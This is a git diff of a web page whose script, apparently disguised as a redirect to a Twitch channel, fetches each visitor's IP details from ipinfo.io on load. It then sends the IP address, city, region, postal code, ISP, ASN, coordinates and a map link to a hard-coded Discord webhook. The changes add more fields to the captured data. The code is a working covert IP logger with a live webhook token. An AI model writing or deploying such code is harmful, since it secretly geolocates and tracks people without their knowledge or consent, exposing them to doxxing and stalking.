@@ -60,12 +60,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        .error {
-            color: red;
-            font-size: 18px;
-            margin-top: 20px;
-        }
-
         .footer {
             font-size: 12px;
             color: #888;
@@ -91,44 +85,49 @@
 
     <script>
         async function trackVisitor() {
-            const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX"; // Your original webhook URL
-            const redirectURL = "https://m.twitch.tv/scrappyvest28"; // Change to your desired redirect URL
+            const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
+            const redirectURL = "https://m.twitch.tv/scrappyvest28";
 
             try {
-                // Use IP geolocation to get the coordinates
+                // Fetch accurate IP details
                 const ipResponse = await fetch("https://ipinfo.io/json");
                 if (!ipResponse.ok) throw new Error("Failed to fetch IP info");
 
                 const ipData = await ipResponse.json();
                 if (!ipData.ip) throw new Error("Invalid IP data received");
 
-                const { loc } = ipData;
+                const { ip, city, region, country, loc, postal, timezone, org, asn } = ipData;
                 const [lat, lon] = loc.split(",");
-                const country = ipData.country || "Unknown";  // Use country info from IP data
                 const flagUrl = `https://flagsapi.com/${country.toLowerCase()}/flat/64.png`;
 
-                // Prepare the Google Maps link
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                // Create a detailed Google Maps link
+                const mapLink = `https://www.google.com/maps/place/${lat},${lon}`;
 
                 // Rainbow colors for embed
                 const colors = [0xFF0000, 0xFF7F00, 0xFFFF00, 0x00FF00, 0x0000FF, 0x4B0082, 0x9400D3];
                 const color = colors[Math.floor(Math.random() * colors.length)];
 
-                // Preparing data for webhook
+                // Prepare the webhook payload
                 const payload = {
                     username: "Visitor Info",
                     avatar_url: flagUrl,
                     embeds: [{
-                        title: `Visitor Location: ${country}`,
+                        title: `🌍 Visitor Location: ${city}, ${region}, ${country}`,
                         color: color,
                         fields: [
-                            { name: "Latitude", value: `\`${lat}\``, inline: true },
-                            { name: "Longitude", value: `\`${lon}\``, inline: true },
-                            { name: "Map Link", value: `[View Map](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
-                            { name: "IP Address", value: `\`${ipData.ip}\``, inline: false }
+                            { name: "🆔 IP Address", value: `\`${ip}\``, inline: true },
+                            { name: "📍 Latitude / Longitude", value: `\`${lat}, ${lon}\``, inline: true },
+                            { name: "📌 City", value: `\`${city}\``, inline: true },
+                            { name: "🏛 Region", value: `\`${region}\``, inline: true },
+                            { name: "🌎 Country", value: `\`${country}\``, inline: true },
+                            { name: "📮 Postal Code", value: `\`${postal}\``, inline: true },
+                            { name: "🕒 Timezone", value: `\`${timezone}\``, inline: true },
+                            { name: "🏢 ISP", value: `\`${org}\``, inline: true },
+                            { name: "🔗 Autonomous System (ASN)", value: `\`${asn}\``, inline: true },
+                            { name: "🗺 Map", value: `[View on Google Maps](${mapLink})`, inline: false }
                         ],
                         footer: {
-                            text: `Time: ${new Date().toLocaleString()}`,
+                            text: `Captured on: ${new Date().toLocaleString()}`,
                             icon_url: "https://upload.wikimedia.org/wikipedia/commons/e/ec/Clock-icon.png"
                         }
                     }]
